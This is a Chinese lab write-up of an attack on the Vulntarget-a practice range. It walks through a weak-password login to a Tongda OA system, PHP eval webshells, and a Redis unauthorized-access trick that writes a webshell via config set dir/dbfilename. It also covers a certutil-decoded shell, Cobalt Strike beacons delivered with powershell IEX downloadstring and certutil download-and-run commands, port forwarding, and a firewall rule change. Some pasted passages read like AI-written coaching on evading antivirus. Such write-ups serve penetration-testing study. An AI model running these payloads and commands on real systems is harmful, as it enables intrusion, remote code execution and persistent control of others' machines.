---
title: "Vunltarget-a 靶场 write up"
date: 2026-04-14
tags: ["域环境"]
toc: true      # <--- 加上这一行
---

已知目标IP为192.168.1.236

# 一 扫描端口

```
sudo nmap --min-rate 10000 -oA nmapscan/ports 192.168.1.236
```

 结果：
```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-13 21:56 EDT
Nmap scan report for 192.168.1.236
Host is up (0.0094s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE
53/tcp  closed domain
80/tcp  open   http
135/tcp open   msrpc
139/tcp open   netbios-ssn
445/tcp open   microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
```

发现有80端口，看看是什么：
发现试着这样的登陆系统：

![](img/Pasted%20image%2020260414110757.png)

使用的时通达OA系统
看看这个有没有什么历史知名漏洞或者弱密码（默认密码）
经典弱密码：用户admin，密码为空
使用经典弱密码成功登录

发现个人文件柜这里可以上传文件，上传文件试试：

![](img/Pasted%20image%2020260414114314.png)

上传websehll试试

```
<?php eval($_POST['cmd']); ?>
```

这里有建立功能，直接建立

尝试访问：
http://192.168.1.236/ispirit/interface/gateway.php?json={%22url%22:%22../../attach/file_folder/202604/1/webshell.php%22}
没有结果，这个即使被解析也无回显

再次创建或或者上传一个文件：
```
<?php echo "OK123"; ?>
```

这次如果被解析，就会返回OK123

没有返回，这个个人文件柜和公共文件柜大概率不是文件解析路径

找不到，使用工具扫描一下吧，
nmap：


nuclei：

没有

专门抓一个通达oa的漏洞工具

使用Iwannagetall工具检测，上传php文件：
使用蚁剑连接，发现总是失败

使用powershell的方法检查：
```

PS C:\Users\86198> Invoke-WebRequest -Uri " http://192.168.1.236/upload_temp/2604/833611053.R4g1776150543405.php" -Method Post -Body "ant=system('whoami');"


StatusCode        : 200
StatusDescription : OK
Content           : R4g1776150543405
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    Connection: keep-alive
                    Vary: Accept-Encoding
                    X-Frame-Options: SAMEORIGIN
                    Content-Type: text/html; charset=gbk
                    Date: Tue, 14 Apr 2026 07:16:08 GMT
                    Serv...
Forms             : {}
Headers           : {[Transfer-Encoding, chunked], [Connection, keep-alive], [Vary, Accept-Encoding], [X-Frame-Options, SAMEORIGIN]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : mshtml.HTMLDocumentClass
RawContentLength  : 16
```
Content           : R4g1776150543405是文件名字的一部分，说明服务可能器确实解析了php文件，但是结果被拦截了，可能禁用了system()函数

改用php非系统函数尝试：
```
Invoke-WebRequest -Uri "http://192.168.1.236/upload_temp/2604/833611053.R4g1776150543405.php" -Method Post -Body "ant=printf(123+456);"
```

还是一样，这说明php根本没有被执行

上传<?php echo "test_ok"; ?>进行测试，结果并没有testOK，这说明其实跟厄本那没有把php文件当成php解析，只是输出成了txt文件

直接使用oa系统漏洞利用工具：


![[Pasted image 20260414190218.png]]

直接获取蚁剑地址，使用蚁剑链接：

成功连接

查看ip，发现内网ip：
![[Pasted image 20260414193426.png]]
10.0.20.98

利用蚁剑上传文件的功能上传cs文件
需要把cs服务端改为桥接模式
利用蚁剑cmd窗口执行cs文件
上线cs：
成功上线

# 三 内网探测
先进行内网探测：

## 3.1 网段发现

1.网段发现：

```
ipconfig /all
```

结果：
```
#[04/15 10:32:19] beacon> ipconfig /all
[04/15 10:32:19] [+] Running ipconfig (T1016)
[04/15 10:32:19] [*] Running ipconfig (T1016)
[04/15 10:32:20] [+] host called home, sent: 3204 bytes
[04/15 10:32:21] [+] received output:
{C16C4D2C-F074-4634-A62D-2B70BC241EE5}
	Ethernet
	Intel(R) PRO/1000 MT Network Connection #2
	00-0C-29-51-3F-53
	10.0.20.98
{0EECF21A-AF38-44FF-B9D1-AA7055B9B9AA}
	Ethernet
	Intel(R) PRO/1000 MT Network Connection
	00-0C-29-51-3F-49
	192.168.1.236
Hostname: 	win7-PC
DNS Suffix: 	
DNS Server: 	192.168.1.1
```


探测路由：
```
shell route print
```

结果：


```
IPv4 路由表
===========================================================================
活动路由:
网络目标        网络掩码          网关       接口   跃点数
          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.236     10
        10.0.20.0    255.255.255.0            在链路上        10.0.20.98    266
       10.0.20.98  255.255.255.255            在链路上        10.0.20.98    266
      10.0.20.255  255.255.255.255            在链路上        10.0.20.98    266
        127.0.0.0        255.0.0.0            在链路上         127.0.0.1    306
        127.0.0.1  255.255.255.255            在链路上         127.0.0.1    306
  127.255.255.255  255.255.255.255            在链路上         127.0.0.1    306
      192.168.0.0    255.255.254.0            在链路上     192.168.1.236    266
    192.168.1.236  255.255.255.255            在链路上     192.168.1.236    266
    192.168.1.255  255.255.255.255            在链路上     192.168.1.236    266
        224.0.0.0        240.0.0.0            在链路上         127.0.0.1    306
        224.0.0.0        240.0.0.0            在链路上     192.168.1.236    266
        224.0.0.0        240.0.0.0            在链路上        10.0.20.98    266
  255.255.255.255  255.255.255.255            在链路上         127.0.0.1    306
  255.255.255.255  255.255.255.255            在链路上     192.168.1.236    266
  255.255.255.255  255.255.255.255            在链路上        10.0.20.98    266

```

发现网段10.0.20.0/24  该机器的内网ip为10.0.20.98

## 3.2 存活主机探测

```
shell for /L %i in (1,1,254) do ping 10.0.20.%i -n 1
```
看看内网网段可以ping通哪机器（动静很大，一个一个ping）

只发现主机10.0.20.99：
```
C:\>ping 10.0.20.99 -n 1 

正在 Ping 10.0.20.99 具有 32 字节的数据:
来自 10.0.20.99 的回复: 字节=32 时间=1ms TTL=128

10.0.20.99 的 Ping 统计信息:
    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，
往返行程的估计时间(以毫秒为单位):
    最短 = 1ms，最长 = 1ms，平均 = 1ms
```
发现内网机器10.0.20.99

直接探测网段机器：
```
arp -a
```
结果：

```
Inteface  --- 0xD
Internet Address        Physical Address        Type                    
10.0.20.99              00-0C-29-F0-0E-C1       dynamic                 
10.0.20.255             FF-FF-FF-FF-FF-FF       static                  
224.0.0.2               01-00-5E-00-00-02       static                  
224.0.0.22              01-00-5E-00-00-16       static                  
224.0.0.252             01-00-5E-00-00-FC       static 
```

同样发现10.0.20.99机器

## 3.3 域环境探测


```
whoami
echo %USERDOMAIN%
```

结果：
```
UserName		SID
====================== ====================================
WORKGROUP\WIN7-PC$	S-1-5-18


GROUP INFORMATION                                 Type                     SID                                          Attributes               
================================================= ===================== ============================================= ==================================================
BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Enabled by default, Enabled group, Group owner, 
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
Mandatory Label\System Mandatory Level            Label                    S-1-16-16384                                  Mandatory group, Enabled by default, Enabled group, 

```

域信息：
```
shell net view /domain
shell net group /domain
shell net user /domain
```
结果依然显示当前为工作组，并非域环境

发现WORKGROUP\WIN7-PC$	S-1-5-18，这说明当前只是工作组环境，并非域环境


### 3.4 枚举当前网络中可通过SMB可见的机器

```
net view
```

结果只有当前机器也就是10.0.20.98，说明其他机器应该是关闭了SMB服务，当前没有发现可通过 SMB 浏览的其他主机


## 3.5 扫描端口

```
powershell Test-NetConnection -ComputerName 10.0.20.99 -Port 445
```

```
powershell Test-NetConnection -ComputerName 10.0.20.99 -Port 3389
```

```
powershell Test-NetConnection -ComputerName 10.0.20.99 -Port 135
```

```
powershell Test-NetConnection -ComputerName 10.0.20.99 -Port 80
```

或者直接使用cs里的portscan功能;
```
portscan 10.0.20.99 445,3389,135,80
```
结果:
10.0.20.99:80
10.0.20.99:6379
发现80端口和6379端口是开着的，这说明我们可以去看看80端口有什么服务

但是这是内网环境，直接看不了，使用代理

# 四 内网代理

在cs里开启socks5代理

右键上线的beacon，选择socks代理：


![[Pasted image 20260415120453.png]]

设置好之后，在浏览器进行代理

![[Pasted image 20260415120646.png]]

使用失败
不知道什么原因

再使用socks4a试试

![[Pasted image 20260415120822.png]]

![[Pasted image 20260415152003.png]]

注意代理服务器应该是kali的IP，因为cs的服务端在kali上，不能再shiyong127.0.0.1，因为127.0.0.1是本地电脑，而不是虚拟机kali

浏览器只有helloworld，什么也没有
![[Pasted image 20260415153620.png]]



可以使用指令测试代理是否成功

```
curl --socks5 127.0.0.1:1234 http://10.0.20.99 -v 
```

结果200，说明代理成功

那这时候kali就已经联通了内网机器10.0.20.99的网络

直接使用代理打
sudo 


fuff使用代理爆破

```
ffuf -u http://10.0.20.99/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x socks5://127.0.0.1:1234
```

- **`-u`**: 目标 URL，`FUZZ` 是爆破位置。
- **`-w`**: 字典路径。
- **`-x`**: 代理服务器地址。
几乎没什么结果：
```
ffuf -u http://10.0.20.99/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x socks5://127.0.0.1:1234

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.20.99/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : socks5://127.0.0.1:1234
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# on atleast 3 different hosts [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 154ms]
#                       [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 331ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 332ms]
#                       [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 483ms]
# directory-list-2.3-small.txt [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 483ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 513ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 610ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 608ms]
# Copyright 2007 James Fisher [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 617ms]
                        [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 611ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 635ms]
#                       [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 1333ms]
#                       [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 1337ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 1326ms]
%20                     [Status: 403, Size: 210, Words: 17, Lines: 10, Duration: 101ms]
*checkout*              [Status: 403, Size: 219, Words: 16, Lines: 10, Duration: 227ms]
*docroot*               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 307ms]
*                       [Status: 403, Size: 210, Words: 16, Lines: 10, Duration: 279ms]
con                     [Status: 403, Size: 212, Words: 16, Lines: 10, Duration: 509ms]
http%3A                 [Status: 403, Size: 214, Words: 16, Lines: 10, Duration: 152ms]
**http%3a               [Status: 403, Size: 216, Words: 16, Lines: 10, Duration: 252ms]
                        [Status: 200, Size: 11, Words: 2, Lines: 1, Duration: 305ms]
aux                     [Status: 403, Size: 212, Words: 16, Lines: 10, Duration: 458ms]
*http%3A                [Status: 403, Size: 215, Words: 16, Lines: 10, Duration: 431ms]
**http%3A               [Status: 403, Size: 216, Words: 16, Lines: 10, Duration: 279ms]
%C0                     [Status: 403, Size: 210, Words: 16, Lines: 10, Duration: 178ms]
:: Progress: [87664/87664] :: Job [1/1] :: 122 req/sec :: Duration: [0:10:33] :: Errors: 0 ::
                                                                                              
```


gobuster不支持加上代理参数，必须借助proxychains

因为所有无效请求都返回 `Size: 11`，我们直接告诉 `ffuf`：“只要回包大小是 11 的，统统不要显示。”

```
ffuf -u http://10.0.20.99/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x socks5://127.0.0.1:1234 -fs 11 -t 10
```

- **`-fs 11`**: (Filter Size) 过滤掉长度为 11 的响应。这是**最关键**的一步。
- **`-t 10`**: 限制并发，保护你的 Beacon 不掉线。
- **`-ic`**: (可选) 忽略字典中的注释行

在使用rockyou字典
```
ffuf -u http://10.0.20.99/FUZZ -w /usr/share/wordlists//common.txt -x socks5://127.0.0.1:1234 -e .php,.txt,.bak -fs 11 -t 10
```



使用fscan扫描试试，使用蚁剑把fscan.exe放进去
win7版本太低，环境不行



使用gobuster，需要先配置proxychains4：
```
sudo nano /etc/proxychains4.conf
```
最后一行加上dialing：
使用#注释掉默认代理
[ProxyList]
#格式：协议  IP地址  端口
socks5  127.0.0.1  1234

验证代理：
```
proxychains4 curl http://10.0.20.99
```
验证成功

借助proxychains4运行gobsuter

```
# 别忘了 --hide-length 11 这个核心参数
proxychains4 gobuster dir -u http://10.0.20.99/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,xml,7z,zip,sql -t 10 --hide-length 11
```
不行

再用fuff扫描:
```
ffuf -u http://10.0.20.99/FUZZ -w /usr/share/wordlists/dirb/common.txt -x socks5://127.0.0.1:1234 -e .php -fs 11  -v
```

结果：
```
[Status: 200, Size: 81667, Words: 4081, Lines: 950, Duration: 657ms]
| URL | http://10.0.20.99/phpinfo.php
    * FUZZ: phpinfo.php

[Status: 200, Size: 81667, Words: 4081, Lines: 950, Duration: 886ms]
| URL | http://10.0.20.99/phpinfo.php
    * FUZZ: phpinfo.php
[Status: 200, Size: 5349, Words: 425, Lines: 113, Duration: 327ms]
| URL | http://10.0.20.99/l.php
    * FUZZ: l.php

[Status: 200, Size: 5349, Words: 425, Lines: 113, Duration: 353ms]
| URL | http://10.0.20.99/L.php
    * FUZZ: L.php
```
发现l.php和phpinfo.info
通过查看phpinfo.php:

![[Pasted image 20260415171131.png]]

发现路径：C:\phpStudy\PHPTutorial\php\php-7.1.13-nts\php.ini


l.php:

![[Pasted image 20260415171530.png]]

发web路径：C:\phpStudy\PHPTutorial\WWW

之前还有redis的端口6379，现在又知道绝对路径，如果redis存在未授权访问可以利用redis写入webshell


#  五 利用redis未授权写入shell

尝试使用代理登陆redis：
使用redis-cli工具尝试：
```
proxychains4 redis-cli -h 10.0.20.99 -p 6379
```
结果：
```
┌──(kali㉿kali)-[~/baji/yukong-a]
└─$ proxychains4 redis-cli -h 10.0.20.99 -p 6379
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  10.0.20.99:6379  ...  OK
10.0.20.99:6379> 

```

成功进入redis界面

在redis界面输入info查看：
获取cpu等详细信息，说明我们堆redis有高权限


为啥未授权进入redis，就可以写入webshell了？
原理：
```
这是一个非常好的问题。很多初学者刚接触 Redis 漏洞时都会有同样的疑问：**“Redis 不是个数据库吗？我进去不应该是翻看里面的数据吗？为什么能直接写文件拿权限？”**

其实，Redis 写 Webshell 的核心原理不是 Redis 自身的业务功能，而是利用了 Redis 的**配置持久化机制**进行的“偷梁换柱”。

---

### 1. 核心原理：利用“快照（Snapshot）”持久化

Redis 为了保证重启后数据不丢失，会定期把内存里的数据保存到硬盘上，这个过程叫 **RDB 持久化**。

Redis 允许你在**运行时**动态修改两个关键配置：

1. **`dir`**：指定数据库文件存放在哪个目录下。
    
2. **`dbfilename`**：指定数据库文件的名字。
    

**漏洞逻辑链：**

- **第一步：** 你登录 Redis 后，把 `dir` 改成了 Web 网站的根目录（比如 `C:/phpStudy/WWW`）。
    
- **第二步：** 你把 `dbfilename` 改成了一个网页文件的名字（比如 `shell.php`）。
    
- **第三步：** 你在内存里存入了一段代码：`set xxx "<?php eval(...); ?>"`。
    
- **第四步：** 当你执行 `save` 命令时，Redis 会强行把**整个内存的内容**（包括你刚才存的那段代码）全部写进 `C:/phpStudy/WWW/shell.php` 这个文件里。
    

虽然生成的 `.php` 文件里会包含很多 Redis 的二进制乱码，但 **PHP 解析器**在处理文件时，会忽略掉无法解析的二进制字符，直到它看到 `<?php ... ?>` 标签并执行其中的内容。这就是为什么你能成功拿到 Webshell。

---

### 2. 为什么不去“获取密码信息”？

你提到的“获取密码信息”通常对应两种渗透思路：

- **思路 A：翻看数据库内容（数据泄露）**
    
    如果你的目标是窃取用户信息、订单数据等，那你确实应该执行 `keys *` 和 `get key_name` 来翻看内容。但在 CTF 或内网渗透练习中，你的最终目标通常是 **RCE (远程命令执行)**，也就是控制整台服务器，而写 Webshell 是最快的方法。
    
- **思路 B：获取系统用户密码**
    
    Redis 运行在内存中，它并不直接存储 Windows 或 Linux 的系统账号密码。如果你想通过 Redis 拿系统权限，除了写 Webshell，还有几种常见姿势：
    
    1. **写 SSH 公钥（仅限 Linux）**：直接把你的公钥写进 `/root/.ssh/authorized_keys`，然后直接 SSH 免密登录。
        
    2. **写计划任务（Crontab）**：让系统定时执行你的反弹 Shell 命令。
        
    3. **主从复制 RCE**：这是 Redis 近年来最流行的利用方式，通过模拟一个从服务器来向主服务器推送恶意的 `.so` 插件，从而直接执行系统命令。
        

---

### 3. 现在的实战建议

既然已经进去了，且目标是 Windows，**写 Webshell 是唯一的也是最有效的方案**。

**操作提示：**

1. **路径是关键**：这就是为什么你需要 `phpinfo`。如果路径写错了（比如写到了一个不存在的文件夹），`config set dir` 会报错，或者 `save` 会失败。
    
2. **数据清理**：Redis `save` 出来的文件很大，因为包含了内存里所有的 key。你写完 Shell 进去后，记得把 Redis 里的干扰数据删一删（当然在练习环境无所谓）。
    

**总结：** 你不是在用 Redis 的功能，而是在**欺骗** Redis 把你的恶意代码当成“数据库备份”存到了 Web 目录下。

你可以尝试执行 `config get dir` 看看现在的默认路径是什么，这能帮你判断目标的安装位置。
```





```
### 3. Redis 写 Webshell 的核心逻辑

Writeup 后面展示的 `config set dir` 这一套操作，是 Redis 漏洞利用中最经典的**“写文件”**手法。它的逻辑是这样的：

1. **找路径**：通过 `phpinfo.php` 确认网站的物理路径（截图里显示是 `C:/phpStudy/PHPTutorial/WWW`）。
    
2. **改目录**：强制让 Redis 把它的数据库备份目录指向网站根目录。
    
    - `config set dir C:/phpStudy/PHPTutorial/WWW`
        
3. **改文件名**：把备份文件名改成 `zcc.php`。
    
    - `config set dbfilename zcc.php`
        
4. **写内容**：把一句话木马写进 Redis 的内存里。
    
    - `set zcc.php "<?php @eval($_POST['kk']);?>"`
        
5. **导出**：执行 `save`。Redis 就会把内存里的东西（包含你的木马）存到 `C:/phpStudy/PHPTutorial/WWW/zcc.php` 里。
```

```
set zcc.php "\n\n<?php @eval(\$_POST['kk']);?>\n\n"
```

手动访问http://10.0.20.99/zcc.php尝试，成功访问，但是有乱码

蚁剑连接，密码是kk,蚁剑连接失败

连不上，有乱码，利用这个zcc.php重新做一个shell：
```
### 第一步：在目标服务器生成 Base64 文本

我们要写入的代码是：`<?php @eval($_POST[1]);?>` 它的 Base64 编码是：`PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==`

执行下面这条命令，通过 `zcc.php` 把这串字符写进一个纯文本里：

Bash


proxychains4 curl -d "kk=system('echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== > C:\\phpStudy\\PHPTutorial\\WWW\\code.txt');" http://10.0.20.99/shell.php --output -


---

### 第二步：利用系统工具解码成 PHP 文件

现在 `code.txt` 里面只有那一串 Base64。我们调用 Windows 自带的证书管理工具 `certutil` 来解码它，这样可以百分之百避开引号、括号和 `$` 符号的干扰：

Bash


proxychains4 curl -d "kk=system('certutil -decode C:\\phpStudy\\PHPTutorial\\WWW\\code.txt C:\\phpStudy\\PHPTutorial\\WWW\\shell.php');" http://10.0.20.99/zcc.php --output -


---

### 第三步：验证与连接

1. **浏览器验证**：访问 `http://10.0.20.99/shell.php`。
    
    - **预期结果**：页面**完全空白**（说明语法正确，没有 Parse error）。
        
2. **蚁剑连接**：
    
    - **URL**: `http://10.0.20.99/shell.php`
        
    - **密码**: `1`
        
    - **编码器**: `base64`（推荐，防止其他乱码干扰）
        
    - **代理设置**: `127.0.0.1:1234` (SOCKS5)
```

使用蚁剑连接，依然报错，连不上

使用curl测试一下：
```
proxychains4 curl -d "1=system('whoami');" http://10.0.20.99/shell.php
```

结果为管理员：
```
┌──(kali㉿kali)-[~/baji/yukong-a]
└─$ proxychains4 curl -d "1=system('whoami');" http://10.0.20.99/shell.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  10.0.20.99:80  ...  OK
vulntarget\administrator
```

测试成功，说明蚁剑有问题可能

使用shell.php投递cs的beacon

# 六 利用shell投递cs的beacon

### 第一步：在 Cobalt Strike 中准备 Listener

1. 打开 CS，点击上方菜单 **`Cobalt Strike` -> `Listeners`**。
    
2. 点击 **`Add`**，创建一个监听器：
    - **Name**: `Internal_10.0.20.99` (随便起)
    - **Payload**: 选择 **`Beacon HTTP`** (或者根据你的内网环境选择)。
    - **HTTP Hosts**: 填你 Kali 的 IP 或者 CS 团队服务器的 IP。
    - **Port**: 比如 `8080`。
### 第二步：生成 PowerShell 上线代码

1. 点击菜单 **`Attacks` -> `Web Drive-by` -> `Scripted Web Delivery (S)`**。

2. 配置如下：
    - **URI Path**: `/a` (越短越好)
    - **Local Port**: `8888`
    - **Listener**: 选择你刚才创建的那个。
    - **Type**: **`powershell`**。
3. 点击 **`Launch`**，CS 会弹出一个框，里面有一串长长的命令，类似于： `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://你的IP:8888/a'))"`
4. 
命令为：
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.115:8888/a'))"
```

### 第三步：通过 Webshell 执行上线命令

回到你的 Kali 终端，利用刚才测试成功的 `curl` 路径，把这串命令喂给 `shell.php`：

Bash

```
# 注意：一定要把 CS 给你的 powershell 命令里的 单引号 换成双引号，或者小心转义
proxychains4 curl -d "1=system('这里填CS生成的整个Powershell命令');" http://10.0.20.99/shell.php
```

** 关键细节：** 如果命令太长导致 `curl` 报错，或者转义太复杂，你可以把 CS 给你的命令存成一个脚本。但通常直接执行是可以的。

```
# 注意：一定要把 CS 给你的 powershell 命令里的 单引号 换成双引号，或者小心转义
proxychains4 curl -d "1=system('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.115:8888/a'))"');" http://10.0.20.99/shell.php
```
执行，发现报错，应该是引号太多导致冲突
这是经典的 **Zsh 引号嵌套与特殊字符冲突** 问题

解决：
1.先把beacon存入变量：
```
CMD='powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\"http://192.168.1.115:8888/a\"))"'
```

2.执行变量
```
proxychains4 curl -d "1=system('$CMD');" http://10.0.20.99/shell.php
```


查看：
```
- **看是否有新上线主机**：有没有听到那声“叮”？如果看到 `10.0.20.99` 变绿并出现在列表中，说明你成功了！
    
- **查看 Web Log**：在 CS 中点击 `View` -> `Web Log`。如果你看到来自 `10.0.20.99` 的 GET 请求（请求路径是 `/a`），说明目标机器已经尝试下载你的 PowerShell 脚本。
```
结果，没有上限，也没有来自10.0.20.99的请求

原因：
10.20.0.99是内网机器，可能访问不到我们的kali服务端


杀毒软件拦截
`powershell` + `IEX` 是杀软（如 Windows Defender）的重点监控对象。

解决：
将web机（边界机）建立流量中转

```
# 意思是：让边界机监听 8080 端口，把收到的流量转发到我 Kali 的 8080 端口
rportfwd 8080 192.168.1.115 8080
```
第一个8080是边界机的端口，第二个端口是kali的端口

修改上线命令：
现在，你发送给 10.0.20.99 的 PowerShell 命令，**IP 不能填你的 Kali IP，要填边界机的内网 IP**。

边界机在 10.0.20.x 段的 IP 是 `10.0.20.98`：

1. **在 CS 生成新的 PowerShell 命令**：
    - 确保监听器（Listener）的 `HTTP Host` 指向你的 Kali。
    - 但在生成的命令中，手动把地址改成 `http://10.0.20.98:8080/a`。
必须把beacon的IP改为边界机器的IP，监听地址也要改为边界机的IP和转发流量的端口，因为内网机器10.20.0.99请求的时候不认识kali的地址192.168.1.115，只认识边界机的内网IP10.0.20.98

![[Pasted image 20260416113956.png]]


![[Pasted image 20260416115256.png]]

![[Pasted image 20260416120815.png]]


这次用8889端口
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.0.20.98:8877/c'))"
```
8088端口：
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.0.20.98:8088/f'))"
```

暂停8080端口转发

```
rportfwd_stop 8080
```

停止所有用流量转发
```
rportfwd stop
```

转发8088端口：

```
rportfwd 8088 127.0.0.1 8088
```
1270.0.1直接转发到cs的服务端，服务端正好在kaili上


kali验证是否能看到webshell：
```
proxychains4 curl http://10.0.20.98:8877/c
```
发现看不到


2. **存入变量执行**：


```
# 确认边界机的 10 段 IP 是 10.0.20.98
CMD='powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\"http://10.0.20.98:8080/a\"))"'

proxychains4 curl -d "1=system('$CMD');" http://10.0.20.99/shell.php
```

存入变量执行:
```
CMD='powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.0.20.98:8088/f'))"'
```

```
proxychains4 curl -d "1=system('$CMD');" http://10.0.20.99/shell.php
```

cs还是没上线

解决：

使用10.0.20.99机器的shell测试能否联通98的8088端口：
```
# 让 99 去测试 98 的 8088 端口是否开放
proxychains4 curl -d "1=system('powershell -c \"Test-NetConnection 10.0.20.98 -Port 8088\"');" http://10.0.20.99/shell.php
```
结果：
```
──(kali㉿kali)-[~/baji/yukong-a]
└─$ proxychains4 curl -d "1=system('powershell -c \"Test-NetConnection 10.0.20.98 -Port 8088\"');" http://10.0.20.99/shell.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  10.0.20.99:80  ...  OK
����: TCP connect to 10.0.20.98:8088 failed


ComputerName           : 10.0.20.98
RemoteAddress          : 10.0.20.98
RemotePort             : 8088
InterfaceAlias         : Ethernet0
SourceAddress          : 10.0.20.99
PingSucceeded          : True
PingReplyDetails (RTT) : 0 ms
TcpTestSucceeded       : False

```

结果，98机器的8088端口没有对10.0.20.99开放

强制让98机器的8088端口对99开放：
在beacon中输入：
```
shell netsh advfirewall firewall add rule name="Allow8088" dir=in action=allow protocol=TCP localport=8088
```

再次尝试cs，结果还是失败

换个方案：
太折磨了，这种“万事俱备只欠上线”的情况，通常只有两种终极可能了：要么是**代码运行即被杀**，要么是**木马回连的配置有误**。

既然 `TcpTestSucceeded` 已经为 `True`，说明网络大门是开着的。咱们别再用 PowerShell 了，PowerShell 在现代内网环境中太容易被内存扫描和静态特征拦截了。

我们换用最原始、最稳的方法：**上传 EXE 运行。**

---

### 终极方案：EXE 落地 + Certutil 下载

#### 第一步：准备木马文件

1. 在 Cobalt Strike 中：`Attacks` -> `Packages` -> `Windows Executable (S)`。
2. **关键点**：`Listener` 必须选你那个 `HTTP Host` 为 `10.0.20.98`、`Port` 为 `8088` 的监听器。
3. 保存为 `s.exe`。
4. 在 CS 中通过 `Web Delivery` 将这个 `s.exe` 挂载，路径设为 `/s`，端口 `8088`。
5. 
```
http://192.168.1.115:80/s.exe
```
#### 第二步：在 WebShell 里分步执行（看报错）

先别指望一步到位，咱们分两步，看看哪步出问题。
http://10.0.20.98:80/x.exe
**1. 下载 EXE 到目标机 (99)**

Bash

```
# 命令：让 99 从 98 下载 s.exe
CMD_DL='certutil.exe -urlcache -split -f http://10.0.20.98:8088/x C:\Windows\Temp\x.exe'
proxychains4 curl -d "1=system('$CMD_DL');" http://10.0.20.99/shell.php
```

> **检查**：执行完后，去 CS 的 **Web Log** 看一眼，有没有一条 `GET /s` 的记录？
> 
> - **有记录**：下载成功。
>     
> - **没记录**：网络层还有鬼，或者 `certutil` 被拦。
>     

**2. 运行 EXE**

Bash

```
# 命令：直接运行刚才下载的 exe
CMD_RUN='C:\Windows\Temp\s.exe'
proxychains4 curl -d "1=system('$CMD_RUN');" http://10.0.20.99/shell.php
```

---

###  为什么 PowerShell 不灵了？

- **AMSI 拦截**：Windows 自带的反恶意软件扫描接口（AMSI）对 `IEX` 下载字符串的操作非常敏感，可能脚本还没执行就被掐死了。
    
- **执行策略**：虽然使用了 `-nop`，但有些严苛的环境会直接限制 PowerShell 访问外网 IP。
    

### 最后的排查细节：

如果在 Web Log 里看到了下载记录，但运行后还是没上线，请**再次双击检查你的监听器配置**：

- **监听器里的 `HTTP Host (Stager)`**：必须是 `10.0.20.98`。
    
- **监听器里的 `HTTP Host (C2)`**：必须是 `10.0.20.98`。
    
- **监听器里的 `HTTP Port (C2)`**：必须是 `8088`。
    
- **监听器里的 `HTTP Port (Bind)`**：**必须填 `8088`**。
    

**如果 EXE 方式下载了但运行还是没反应，那只有一个解释：99 的防火墙拦截了 99 主动访问 98 的流量。这时候你该上“SMB Beacon”了（445 端口），这是绝对不需要你做任何端口转发的终极方案。需要换 SMB 方案吗？**


